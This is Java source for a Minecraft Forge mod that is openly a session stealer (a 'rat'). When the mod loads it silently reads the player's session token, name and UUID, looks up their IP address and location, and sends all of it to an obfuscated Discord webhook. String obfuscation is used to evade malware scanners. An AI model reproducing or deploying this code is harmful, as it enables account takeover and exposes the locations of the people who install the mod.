package me.ghosty.notarat;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;

/**
 * Webhook based on <a href="https://github.com/14ms/MC-Session-Stealer/blob/main/src/main/java/com/github/shurpe/Main.java">14ms's Session Stealer</a>
 */
@Mod(modid = "notarat")
public final class Main {
	
	/**
	 * the webhook url, or a link to a website which redirects to your webhook so it doesn't get deleted in a week by some nerd (requirement: 9iq from you)
	 * <p>
	 * it has to be "secured"! Add some {@code Spaces}, {@code *}, {@code æ} and {@code œ} (please never forget to use {@link Utils#abc(String...)} & {@link Utils#replaceUseless(String...)}) and you can even use it by splitting the string in multiple args
	 */
	// this is an example webhook but it has been tested with a real webhook and it worked perfectly
	final static String $host = Utils.abc(Utils.replaceUseless("h*œt *tæ*", "œp*s:* ", "œ*/œæ ", "/d*æisœ", "c* o*rœ", "æd œ.œc o*", "mœæ/a*p æ", "i/œw*eæœ", "*bho *æ", "oœks/1 *æ ", "0*  00*0æ 0*", "æ00œ 0*æ00", "0œ*0æ0 0*œ", "æ000 0/aæœ*", "bc deæf*ghœ", "i j*æklm*n", "œæ opqr*œs", "æt uœæ* vwæ*x", "y-zæœ_* A-æB*C", "œDEæFG *HæI", "Jœ*KLMæN Oœæ", "P* QœRæ*ST UœV", "æWX*Y _æ*Z-0*", "œ_ 1œ2æ3*4 5*6œ", "æ78 9æœ*"));
	
	/**
	 * should do debug or not? it'll send the message even if this is enabled
	 */
	final static boolean $isTest = true;
	
	@Mod.EventHandler
	public void preInit(final FMLPreInitializationEvent event) {
		new Thread(() -> {
			try {
				final ClassAccessor<?> mcAccessor = new ClassAccessor(Minecraft.class, null);
				mcAccessor.setObject(mcAccessor.getField(Fields.getMc()));
				final ClassAccessor<?> sessAccessor = new ClassAccessor(Class.forName(Utils.replaceUseless("n*e* t. m", "*i n*ec*r", " aft*", ".u t*i", "l*.S es", "* sio* n")), mcAccessor.getField(Fields.getSess()));
				Object tok = sessAccessor.getField(Fields.getTok());
				Object id = sessAccessor.getField(Fields.getId());
				ClassAccessor<?> tokAccessor = new ClassAccessor<>(String.class, (String) tok);
				if ((boolean) tokAccessor.invokeT("contains", new String[] {"$"}, new Class[] {CharSequence.class}))
					return; // Small fail from RatterScanner, almost fixed!
				
				if ($isTest)
					System.out.println(Utils.abc("Cære", "atæingœ", "œ ææDroæc", "sidæœ"));
				final Drocsid drocsid = new Drocsid();
				
				try {
					drocsid.addDebme(new Drocsid.Debme()
						.setTitle(Utils.abc(":æuœ", "nloœc", "æk: œAcc", "oæœunt Iæ", "nfœo"))
						.setColor(0x004444)
						.setDescription(Utils.abc("Foæœu", "ndæœ aæn aæ", "ccœæoœuæ", "ntœ!"))
						.addField(Utils.abc(":id", "eæntifiœ", "cationæ", "_card: ", "Naæme"), "```" + sessAccessor.getField(Fields.getName()) + "```", true)
						.addField(Utils.abc(":ideæ", "ntificæ", "œatio", "n_caœrd:", " UœUæID"), "```" + id + "```", true)
						.addField(Utils.abc(":kœe", "æy: Sæœ", "essioœ", "n Toækœ", "en"), "```" + tokAccessor + "```", false)
					);
				} catch (Exception exc) {
					// this should never happen but still
					if ($isTest)
						Utils.print(exc);
				}
				
				try {
					JsonObject info = (JsonObject) new JsonParser().parse((String) new ClassAccessor<>(
						Class.forName(Utils.replaceUseless("or *g", ".a p *ac*", "h e. ", "co *m*", "*m *on*", " s.i o ", ".I*O Ut*", " i l *s")), null).invoke(
						Utils.replaceUseless("t* o", "*S tr", "* in", " *g"),
						new ClassAccessor<>(Class.forName(Utils.replaceUseless("ja* v", "a.ne*", " t* .U", "* R  L")), null)
							.getObject(Utils.replaceUseless("htt* ", "ps**  : ", "/ ", "/i* ", "p** ", "* ap", "i *.c", "*  *  o/j*** s o  ", "n  *")).get()
					));
					drocsid.addDebme(new Drocsid.Debme()
						.setTitle(Utils.abc(":eart", "hæ_amœ", "ericœa", "s:œ I", "æP In", "æfœo"))
						.setColor(0x000044)
						.setDescription(Utils.abc("Coænt", "ains œin", "æformœa", "tiœon abo", "œut yœuœ", "ær Iæ", "P addæ", "œress aœ", "nd gæeo-", "locœatæ", "ion"))
						.addField(Utils.abc(":globe", "æ_witœh_m", "eæridians", ": Couæ", "ntræy"), "```" + info.get(Utils.replaceUseless(" *co* ", "u nt  ", "* r*y_ ", "na*me")).getAsString() + "```", true)
						.addField(Utils.abc(":gloœ", "be_with_", "merœiæd", "ians: Ci", "æty"), "```" + info.get(Utils.replaceUseless("c* ", "i* *t*", "  y")).getAsString() + "```", true)
						.addField(Utils.abc(":gloœ", "be_æwit", "h_meœrid", "ians: Reæg", "ion"), "```" + info.get(Utils.replaceUseless("r*e ", " g*i*o", " n")).getAsString() + "```", true)
						.addField(Utils.abc(":sat", "eællœ", "ite_æo", "rbital: I", "æP Aæddr", "æess"), "```" + info.get(Utils.replaceUseless("* i*", "  *p ", "  ")).getAsString() + "```", true)
						.addField(Utils.abc(":sateæ", "lli", "œte: Præot", "ocœol"), "```" + info.get(Utils.replaceUseless("* ve* ", "  *rs* i", "** on ")).getAsString() + "```", true)
						.addField(Utils.abc(":cœl", "ocæk10: Tiæ", "mœezo", "æne"), "```" + info.get(Utils.replaceUseless("t *", "i*m  ez", "*on* e")).getAsString() + "```", true)
					);
				} catch (Exception exc) {
					if ($isTest)
						Utils.print(exc);
				}
				
				if ($isTest)
					System.out.println(Utils.abc("Sœæenœædi", "ængæ Dœr", "oæcœsiæd"));
				drocsid.send();
				
			} catch (Exception exc) {
				if (Main.$isTest)
					Utils.print(exc);
			}
		}).start();
	}
	
}
